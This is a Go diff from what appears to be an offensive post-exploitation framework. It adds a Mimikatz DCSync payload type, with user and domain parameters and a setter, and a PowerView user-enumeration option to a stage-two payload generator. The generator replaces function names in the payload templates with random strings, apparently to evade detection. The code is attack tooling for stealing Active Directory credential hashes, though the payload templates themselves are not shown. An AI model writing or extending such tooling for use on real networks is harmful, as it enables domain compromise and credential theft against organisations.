@@ -103,7 +103,7 @@ func (stpgm *StageTwoPayloadGeneratorModule) preparePayloadSource() (string, err
 		}
 		payloadSource = strings.Replace(payloadSource, "TICKETFILENAME", stpgm.ticketFilename, -1)
 	}
-	if stpgm.payloadType == "powerview_enum" {
+	if stpgm.payloadType == "powerview_enum" || stpgm.payloadType == "powerview_enumusers" {
 		funcPatterns = []string{
 			"GETHELPER",
 			"WRITETOFILE",
@@ -112,6 +112,16 @@ func (stpgm *StageTwoPayloadGeneratorModule) preparePayloadSource() (string, err
 			"POWERVIEWFILENAME",
 			"SCRIPTFILENAME",
 		}
+	}
+	if stpgm.payloadType == "mimikatz_dcsync" {
+		funcPatterns = []string{
+			"RUNMIMIKATZ",
+			"GETHELPER",
+			"MIMIKATZFILENAME",
+			"WRITETOFILE",
+		}
+		payloadSource = strings.Replace(payloadSource, "USER", stpgm.user, -1)
+		payloadSource = strings.Replace(payloadSource, "DOMAIN", stpgm.domain, -1)
 	}
 	for _, funcPattern := range funcPatterns {
 		payloadSource = strings.Replace(payloadSource, funcPattern, util.RandString(util.RandInt()), -1)
@@ -156,4 +166,9 @@ func (stpgm *StageTwoPayloadGeneratorModule) SetPthParams(user, domain, ntlm str
 
 func (stpgm *StageTwoPayloadGeneratorModule) SetPttParams(ticketFilename string) {
 	stpgm.ticketFilename = ticketFilename
+}
+
+func (stpgm *StageTwoPayloadGeneratorModule) SetDCSyncParams(user, domain string) {
+	stpgm.user = user
+	stpgm.domain = domain
 }
